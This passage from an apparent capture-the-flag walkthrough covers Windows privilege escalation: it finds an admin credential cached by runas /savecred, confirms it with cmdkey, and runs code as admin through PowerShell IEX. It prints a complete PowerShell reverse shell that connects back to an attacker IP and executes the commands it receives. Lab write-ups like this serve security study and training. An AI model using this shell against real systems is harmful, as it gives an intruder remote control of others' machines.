It runs runas with /savecred flag. This implies the credential for admin is cached in somewhere.

To check it, we can use cmdkey command.

We confirm our assumption is correct.

Though we now know it's possible to run command as Admin using info we gathered, we cannot simply type the root text because it opens new commandline tab and execute our code. However, we can establish reverse shell because it doesn't mean we cannot execute commands but we cannot move to newly generated tab.

For proving it, we can host http and serve reverse shell code to the target machine.

We have powershell command IEX which evaluates or runs a specified string as a command or expression within the current scope and returns the results. Using it, we can query reverse shell code from our own machine and execute it.

$LHOST = "10.10.16.38"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
